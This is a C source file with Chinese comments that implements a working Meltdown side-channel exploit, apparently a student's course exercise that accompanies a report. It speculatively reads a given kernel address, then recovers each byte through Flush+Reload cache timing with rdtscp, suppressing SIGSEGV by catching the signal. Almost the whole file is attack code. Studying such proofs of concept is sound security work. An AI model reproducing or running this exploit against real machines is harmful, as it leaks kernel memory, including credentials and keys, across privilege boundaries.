#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h> 
#include <unistd.h>
#include <fcntl.h>
#include <x86intrin.h>
#define pagesize 4096

jmp_buf jump;

static char volatile check[256*pagesize]={};

static void deal_segmentation(int sig){
    //段错误跳回函数 注意要使用siglongjmp而不是longjmp
    (void)sig;
    siglongjmp(jump,1);
}

static inline void maccess(void *p) {
  asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");//读取该字节
}

int get_time(volatile char *addr){ //读取一个地址内的字节读出来的时间，以判断是否在cache中
    unsigned long long  time1,time2;
    int tmp=0;
    time1 = __rdtscp(&tmp);//记录一个时间
    maccess(addr);//读取
    time2 = __rdtscp(&tmp) - time1;//记录第二个时间，减去第一个时间就是总时间
    return time2;
}

void flush(){//清空check数组，使其全部不在cache中
    int i;
    for (i=0;i<256;i++){
        _mm_clflush(&check[i*pagesize]);
    }    
}

int  reload(){  //检查check数组里每个位置读取的时间，寻找最小的那个，即可判断攻击地址的值
    int i,m;
    int volatile mix_i,min_i,min_time=2000,j,time;
    char *check_addr;
    for (i=0;i<256;i++){
        mix_i=((i * 167) + 13) & 255;
        check_addr=&check[pagesize*mix_i];
        time=get_time(check_addr);
        if (min_time > time){
            min_time=time;
            min_i=mix_i;
            j=i;
        }
    }
    return min_i;   
}

attack(char* addr)
{	
	//攻击的核心代码，试探攻击指定地址的内容，是一段内嵌汇编

	if (!sigsetjmp(jump,1)){//设置出现段错误信号后的跳回点

	asm volatile (//volatile让编译器不会优化这段代码
    /*下面三行来自proc内的内嵌汇编，作用是进行一定的延时保证变量进入cache*/
		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"
    /*
    试探读取字符
    这里因为proc中似乎是用协程使中断后继续进行，而本程序是捕获SIGSEGV信号，所以代码不同
    当然在movzx这里本应该失败，但是预读取会使这三段代码都会执行
    第一行必须是movzx而不是mov是因为movzx是高位如果有多余位则填充0填入指定寄存器
    第二行是将读取值乘上pagesize，以为设置的是4096，所以左移12位
    第三行尝试读取攻击值地址的内容，使改地址值进入cache
    */
		"movzx (%[addr]), %%rax\n\t"
        "shl $12, %%rax\n\t"
        "mov (%[target], %%rax, 1), %%rbx\n"
		:
		: [target] "r" (check),
		  [addr] "r" (addr)
		: "rax","rbx"
	);	
	}

}

int readbyte(int fd,char *addr){//运用meltdown原理读取指定地址addr内一个字节的内容
    //具体见报告
    static char buf[256];
    memset(check, 1, sizeof(check));
    pread(fd, buf, sizeof(buf), 0);
    
    flush();
    //_mm_mfence();   
    attack(addr);

    return reload();
}

int max(int *score){//搜寻所有猜测中最多的
    int i,j;
    for (i=j=0;i<256;i++){
        if (score[i]>score[j]) j=i;
    }
    return j;
}

int main(int argc, const char* * argv){
    
    signal(SIGSEGV,deal_segmentation);//注册SIGSEGV信号的捕获函数
    int score[256]={};
    char* addr;
    int tmp,len;
    int fd = open("/proc/version", O_RDONLY);//打开一个文件，暂时不知道有什么作用，参考的是proc里的代码。如果没有
                                            //会失败。猜测和数组存入cache有关
    sscanf(argv[1],"%lx",&addr);//melt.sh传来了linux_proc_banner的地址
    sscanf(argv[2],"%d",&len);//读取100个字节的值
    printf("读取该地址：%lx后%d长度的内容\n",addr,len);
    for (int j=0;j<len;j++){
        memset(score,0,sizeof(score));
        for (int i=0;i<1000;i++){//进行1000次猜测
            score[readbyte(fd,addr)]++;//猜测的值加1
        }
        tmp=max(score);
        printf("%c",tmp);  
        addr++;      
    }
    printf("\n");
}